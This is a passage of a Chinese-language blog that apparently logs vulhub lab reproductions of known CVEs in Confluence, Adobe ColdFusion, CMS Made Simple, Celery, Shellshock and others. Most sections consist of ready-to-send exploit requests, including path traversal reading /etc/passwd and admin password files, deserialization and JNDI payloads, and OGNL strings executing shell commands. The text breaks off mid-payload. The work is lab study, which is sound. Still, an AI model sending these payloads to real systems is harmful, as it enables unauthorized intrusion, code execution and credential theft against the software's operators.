title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为<code>admin</code>。</p><p>构造头<code>Authorization: Digest username=admin</code>，并发送如下数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Digest username=admin</span><br></pre></td></tr></table></figure><p>可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：</p></blockquote><p><img src="37.jpg" alt="37"><br><img src="38.jpg" alt="38"></p><blockquote><p>设置这个session到浏览器，即可正常访问需要认证的页面：</p></blockquote><p><img src="39.jpg" alt="39"></p><h1 id="Aria2-任意文件写入漏洞-（未完成）"><a href="#Aria2-任意文件写入漏洞-（未完成）" class="headerlink" title="Aria2 任意文件写入漏洞 （未完成）"></a>Aria2 任意文件写入漏洞 （未完成）</h1><blockquote><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP&#x2F;HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p><p>参考文章：[<a href="https://paper.seebug.org/120/][1]">https://paper.seebug.org/120/][1]</a></p></blockquote><h2 id="漏洞复现-13"><a href="#漏洞复现-13" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a href="http://binux.github.io/yaaw/demo/">http://binux.github.io/yaaw/demo/</a> 。</p><p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：<code>http://your-ip:6800/jsonrpc</code></p></blockquote><p>这个多半需要公网环境… 回去再搞</p><h1 id="Bash-Shellshock-破壳漏洞（CVE-2014-6271）（未完成）"><a href="#Bash-Shellshock-破壳漏洞（CVE-2014-6271）（未完成）" class="headerlink" title="Bash Shellshock 破壳漏洞（CVE-2014-6271）（未完成）"></a>Bash Shellshock 破壳漏洞（CVE-2014-6271）（未完成）</h1><blockquote><p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p><p>将payload附在User-Agent中访问victim.cgi：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: () &#123; foo; &#125;; echo Content-Type: text/plain; echo; /usr/bin/id</span><br></pre></td></tr></table></figure><p>命令成功被执行：</p></blockquote><p>不知道为啥就是没有正常回显…</p><h1 id="Cacti-前台命令注入漏洞（CVE-2022-46169）-未完成"><a href="#Cacti-前台命令注入漏洞（CVE-2022-46169）-未完成" class="headerlink" title="Cacti 前台命令注入漏洞（CVE-2022-46169）(未完成)"></a>Cacti 前台命令注入漏洞（CVE-2022-46169）(未完成)</h1><blockquote><p>Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf">https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf</a></li><li><a href="https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A">https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A</a></li></ul></blockquote><p>8080端口的容器一开就死 跳了</p><h1 id="Celery"><a href="#Celery" class="headerlink" title="Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用"></a>Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</h1><blockquote><p>Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p><p>在Celery &lt; 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。</p></blockquote><h2 id="漏洞复现-14"><a href="#漏洞复现-14" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>漏洞利用脚本<code>exploit.py</code>仅支持在python3下使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br><span class="line">python exploit.py [主机IP]</span><br></pre></td></tr></table></figure><p>查看结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose logs celery</span><br></pre></td></tr></table></figure></blockquote><p><img src="40.jpg" alt="40"><br><img src="41.jpg" alt="41"><br><img src="42.jpg" alt="42"></p><h1 id="CGI-HTTPoxy漏洞（CVE-2016-5385）（未完成）"><a href="#CGI-HTTPoxy漏洞（CVE-2016-5385）（未完成）" class="headerlink" title="CGI HTTPoxy漏洞（CVE-2016-5385）（未完成）"></a>CGI HTTPoxy漏洞（CVE-2016-5385）（未完成）</h1><blockquote><p>根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p><p>PHP5.6.24版本修复了该漏洞，不会再将<code>Proxy</code>放入环境变量中。本环境使用PHP 5.6.23为例。</p><p>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。CVE-2016-5385是PHP的CVE，HTTPoxy所有的CVE编号如下：</p><ul><li>CVE-2016-5385: PHP</li><li>CVE-2016-5386: Go</li><li>CVE-2016-5387: Apache HTTP Server</li><li>CVE-2016-5388: Apache Tomcat</li><li>CVE-2016-6286: spiffy-cgi-handlers for CHICKEN</li><li>CVE-2016-6287: CHICKEN’s http-client</li><li>CVE-2016-1000104: mod_fcgi</li><li>CVE-2016-1000105: Nginx cgi script</li><li>CVE-2016-1000107: Erlang inets</li><li>CVE-2016-1000108: YAWS</li><li>CVE-2016-1000109: HHVM FastCGI</li><li>CVE-2016-1000110: Python CGIHandler</li><li>CVE-2016-1000111: Python Twisted</li><li>CVE-2016-1000212: lighttpd</li></ul><p>参考链接：</p><ul><li><a href="https://httpoxy.org/aaaaahttp://www.laruence.com/2016/07/19/3101.html">https://httpoxy.org/aaaaahttp://www.laruence.com/2016/07/19/3101.html</a></li></ul></blockquote><h1 id="CMS-Made-Simple-CMSMS-2-2-10-前台SQL注入漏洞（CVE-2019-9053）"><a href="#CMS-Made-Simple-CMSMS-2-2-10-前台SQL注入漏洞（CVE-2019-9053）" class="headerlink" title="CMS Made Simple (CMSMS) &lt; 2.2.10 前台SQL注入漏洞（CVE-2019-9053）"></a>CMS Made Simple (CMSMS) &lt; 2.2.10 前台SQL注入漏洞（CVE-2019-9053）</h1><blockquote><p>CMS Made Simple（CMSMS）是一个免费的开放源码内容管理系统，为开发人员、程序员和网站所有者提供基于网络的开发和管理功能。</p><p>在 2.2.9.1 之前的版本中，CMS Made Simple 存在一个未验证的 SQL 注入漏洞，攻击者可利用该漏洞获取管理员密码或密码重置令牌。结合后台的 SSTI 漏洞（<a href="https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120">CVE-2021-26120</a>），攻击者可在目标服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li><li><a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a></li></ul></blockquote><h2 id="漏洞复现-15"><a href="#漏洞复现-15" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先是配置<br>环境环境启动后，你需要访问<code>http://your-ip/install.php</code>并安装CMS服务。<br>安装过程请根据页面中的安装向导来进行，其中MySQL数据库的地址是<code>db</code>，数据库名是<code>cmsms</code>，账号和密码均为<code>root</code>。</p><p><img src="43.jpg" alt="43"></p><blockquote><p>使用<a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a>中的脚本来利用SQL注入漏洞：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 poc.py -u http://127.0.0.1</span><br></pre></td></tr></table></figure><p>注:kali自带python2 3 但是3运行该py会报错 2又缺一些组件 pip2又不自带 安装很是麻烦<br><img src="44.jpg" alt="44"><br>等他程序自己把密码爆出来就完事了</p><h1 id="CMS-Made-Simple-CMSMS-前台代码执行漏洞（CVE-2021-26120）"><a href="#CMS-Made-Simple-CMSMS-前台代码执行漏洞（CVE-2021-26120）" class="headerlink" title="CMS Made Simple (CMSMS) 前台代码执行漏洞（CVE-2021-26120）"></a>CMS Made Simple (CMSMS) 前台代码执行漏洞（CVE-2021-26120）</h1><blockquote><p>CMS Made Simple（CMSMS）是一个免费的开放源码内容管理系统，为开发人员、程序员和网站所有者提供基于网络的开发和管理功能。</p><p>Smarty 3.1.39 之前的版本允许在 <code>&#123;function name=</code> 子串后注入PHP代码，导致代码注入漏洞，该漏洞即为CVE-2021-26120。</p><p>CMS Made Simple 版本 &lt;&#x3D; 2.2.15，拥有设计师权限的用户可以在后台利用服务端模板注入漏洞，即为前面提到的CVE-2021-26120。</p><p>因此，如果CMSMS版本低于2.2.9.1，未授权的攻击者可以结合<a href="https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053">CVE-2019-9053</a>和CVE-2021-26120漏洞，在服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li><li><a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a></li></ul></blockquote><h2 id="漏洞复现-16"><a href="#漏洞复现-16" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先是配置<br>环境环境启动后，你需要访问<code>http://your-ip/install.php</code>并安装CMS服务。<br>安装过程请根据页面中的安装向导来进行，其中MySQL数据库的地址是<code>db</code>，数据库名是<code>cmsms</code>，账号和密码均为<code>root</code>。</p><p><img src="43.jpg" alt="43"></p><blockquote><p>使用<a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a>中分享的<a href="poc.py">POC</a>，可以使用SQL注入漏洞重置管理员密码，并执行任意命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py 127.0.0.1 / id</span><br></pre></td></tr></table></figure></blockquote><p><img src="45.jpg" alt="45"></p><p>可见，<code>id</code>命令已被成功执行。</p><h1 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p></blockquote><h2 id="漏洞复现-17"><a href="#漏洞复现-17" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>直接访问<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，即可读取文件<code>/etc/passwd</code>：</p></blockquote><p><img src="46.jpg" alt="46"></p><blockquote><p>读取后台管理员密码<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>：</p></blockquote><p><img src="47.jpg" alt="47"></p><h1 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><p>参考链接：</p><ul><li><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></li><li><a href="https://www.exploit-db.com/exploits/43993">https://www.exploit-db.com/exploits/43993</a></li><li><a href="https://github.com/codewhitesec/ColdFusionPwn">https://github.com/codewhitesec/ColdFusionPwn</a></li></ul></blockquote><h2 id="漏洞复现-18"><a href="#漏洞复现-18" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#x27;touch /tmp/success&#x27; poc.ser</span><br></pre></td></tr></table></figure><p>POC生成于poc.ser文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，Content-Type为application&#x2F;x-amf：</p></blockquote><p><img src="48.jpg" alt="48"><br>这里burp用的是“粘贴文件至”来发送的数据包 不然容易出现错误<br><img src="49.jpg" alt="49"><br>一般来说正常返回完文件也会被正常创建 但多半是ysoserial版本不对 没有正常创建</p><blockquote><p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p><p>将POC改成<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">反弹命令</a>，成功拿到shell：</p></blockquote><h1 id="Adobe-ColdFusion-本地文件包含漏洞（CVE-2023-26360）"><a href="#Adobe-ColdFusion-本地文件包含漏洞（CVE-2023-26360）" class="headerlink" title="Adobe ColdFusion 本地文件包含漏洞（CVE-2023-26360）"></a>Adobe ColdFusion 本地文件包含漏洞（CVE-2023-26360）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 2018 Update 15 和 2021 Update 5 版本及以前，存在一处文件包含漏洞。攻击者可以利用该漏洞在服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://xz.aliyun.com/t/13392">https://xz.aliyun.com/t/13392</a></li></ul></blockquote><h2 id="漏洞复现-19"><a href="#漏洞复现-19" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>发送如下请求即可读取文件<code>/proc/self/environ</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /cf\_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;\_cfclient=true HTTP/1.1</span><br><span class="line">Host: localhost:8500</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 82</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">\_variables=&#123;&quot;\_metadata&quot;:&#123;&quot;classname&quot;:&quot;../../../../../../../../proc/self/environ&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>你可以在返回包中找到Adobe ColdFusion的根目录<code>/opt/coldfusion/cfusion</code>：</p></blockquote><p><img src="50.jpg" alt="50"></p><blockquote><p>从<code>../../../../../../../../opt/coldfusion/cfusion/lib/password.properties</code>中读取服务器密码：</p></blockquote><p><img src="51.jpg" alt="51"></p><blockquote><p>想要利用文件包含漏洞执行任意代码，需要先发送如下请求来写入CFM脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /cf\_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;\_cfclient=true HTTP/1.1</span><br><span class="line">Host: localhost:8500</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 67</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">\_variables=&lt;cfexecute name=&#x27;id&#x27; outputFile=&#x27;/tmp/success&#x27; &gt;&lt;/cfexecute&gt;</span><br></pre></td></tr></table></figure><p>然后包含日志文件，执行该CFM代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /cf\_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;\_cfclient=true HTTP/1.1</span><br><span class="line">Host: localhost:8500</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 111</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">\_variables=&#123;&quot;\_metadata&quot;:&#123;&quot;classname&quot;:&quot;../../../../../../../../opt/coldfusion/cfusion/logs/coldfusion-out.log&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>可见，<code>id</code>命令的执行结果已经被写入<code>/tmp/success</code>：</p></blockquote><p><img src="52.jpg" alt="52"></p><h1 id="Adobe-ColdFusion-XML-反序列化命令执行漏洞（CVE-2023-29300）"><a href="#Adobe-ColdFusion-XML-反序列化命令执行漏洞（CVE-2023-29300）" class="headerlink" title="Adobe ColdFusion XML 反序列化命令执行漏洞（CVE-2023-29300）"></a>Adobe ColdFusion XML 反序列化命令执行漏洞（CVE-2023-29300）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion在2018.0.16、2021.0.6、2023.0.0.330468版本及以前，存在一处XML反序列化漏洞。攻击者可以利用该漏洞调用Java中任意setter方法，最终执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://blog.projectdiscovery.io/adobe-coldfusion-rce/">https://blog.projectdiscovery.io/adobe-coldfusion-rce/</a></li><li><a href="https://xz.aliyun.com/t/13413">https://xz.aliyun.com/t/13413</a></li></ul></blockquote><h2 id="漏洞复现-20"><a href="#漏洞复现-20" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>要利用这个漏洞，需要先找到一个可利用的setter方法作为Gadget。最常见的Gadget是利用<code>com.sun.rowset.JdbcRowSetImpl</code>来进行JNDI注入，并执行任意命令。</p><p>首先，启动一个恶意JNDI服务器，并加载<code>CommonsBeanutils1</code>作为内层反序列化Gadget。Github上有数个工具可以使用，比如<a href="https://github.com/rebeyond/JNDInjector/releases">https://github.com/rebeyond/JNDInjector/releases</a>：</p></blockquote><p><img src="53.jpg" alt="53"></p><blockquote><p>然后，将恶意LDAP地址替换到如下请求中发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /CFIDE/adminapi/accessmanager.cfc?method=foo&amp;\_cfclient=true HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 333</span><br><span class="line">argumentCollection=&lt;wddxPacket version=&#x27;1.0&#x27;&gt;&lt;header/&gt;&lt;data&gt;&lt;struct type=&#x27;xcom.sun.rowset.JdbcRowSetImplx&#x27;&gt;&lt;var name=&#x27;dataSourceName&#x27;&gt;&lt;string&gt;ldap://192.168.0.196/PJlkCbYLJV/CommonsBeanutils1/Exec/eyJjbWQiOiJ0b3VjaCAvdG1wL3dvd3dlZGlkaXQifQ==&lt;/string&gt;&lt;/var&gt;&lt;var name=&#x27;autoCommit&#x27;&gt;&lt;boolean value=&#x27;true&#x27;/&gt;&lt;/var&gt;&lt;/struct&gt;&lt;/data&gt;&lt;/wddxPacket&gt;</span><br></pre></td></tr></table></figure></blockquote><p>localhost处改端口似乎是必要的 改完就成功复现了</p><p><img src="54.jpg" alt="54"></p><blockquote><p>可见，<code>touch /tmp/success</code>已被成功执行：</p></blockquote><p><img src="55.jpg" alt="55"></p><h1 id="Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）"><a href="#Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）" class="headerlink" title="Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）"></a>Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。</p><p>参考资料：</p><ul><li><a href="https://paper.seebug.org/884/">https://paper.seebug.org/884/</a></li><li><a href="https://jira.atlassian.com/browse/CONFSERVER-57974">https://jira.atlassian.com/browse/CONFSERVER-57974</a></li></ul></blockquote><h2 id="漏洞复现-21"><a href="#漏洞复现-21" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境启动后，访问<code>http://your-ip:8090</code>会进入安装引导，选择“Trial installation”，之后会要求填写license key。点击“Get an evaluation license”，去Atlassian官方申请一个Confluence Server的测试证书：</p><p>然后点击Next安装即可。这一步小内存VPS可能安装失败或时间较长（建议使用4G内存以上的机器进行安装与测试），请耐心等待。</p><p>如果提示填写cluster node，路径填写<code>/home/confluence</code>即可：</p></blockquote><p><img src="56.jpg" alt="56"></p><blockquote><p>发送如下数据包，即可读取文件<code>web.xml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: localhost:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 176</span><br><span class="line">&#123;&quot;contentId&quot;:&quot;786458&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc6&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;\_template&quot;:&quot;../web.xml&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="57.jpg" alt="57"></p><h1 id="Atlassian-Confluence-OGNL表达式注入命令执行漏洞（CVE-2021-26084）"><a href="#Atlassian-Confluence-OGNL表达式注入命令执行漏洞（CVE-2021-26084）" class="headerlink" title="Atlassian Confluence OGNL表达式注入命令执行漏洞（CVE-2021-26084）"></a>Atlassian Confluence OGNL表达式注入命令执行漏洞（CVE-2021-26084）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统，其部分版本中存在OGNL表达式注入漏洞。攻击者可以通过这个漏洞，无需任何用户的情况下在目标Confluence中执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html</a></li><li><a href="https://jira.atlassian.com/browse/CONFSERVER-67940">https://jira.atlassian.com/browse/CONFSERVER-67940</a></li><li><a href="https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md">https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</a></li><li><a href="https://github.com/h3v0x/CVE-2021-26084_Confluence">https://github.com/h3v0x/CVE-2021-26084_Confluence</a></li></ul></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p>有多个接口可以触发这个OGNL表达式注入漏洞。</p><h3 id="pages-doenterpagevariables-action"><a href="#pages-doenterpagevariables-action" class="headerlink" title="&#x2F;pages&#x2F;doenterpagevariables.action"></a>&#x2F;pages&#x2F;doenterpagevariables.action</h3><p>这个接口不需要登录即可利用，发送如下数据包，即可看到<code>233*233</code>已被执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /pages/doenterpagevariables.action HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 47</span><br><span class="line">queryString=%5cu0027%2b%7b233\*233%7d%2b%5cu0027</span><br></pre></td></tr></table></figure></blockquote><p><img src="58.jpg" alt="58"></p><blockquote><p>执行任意命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedR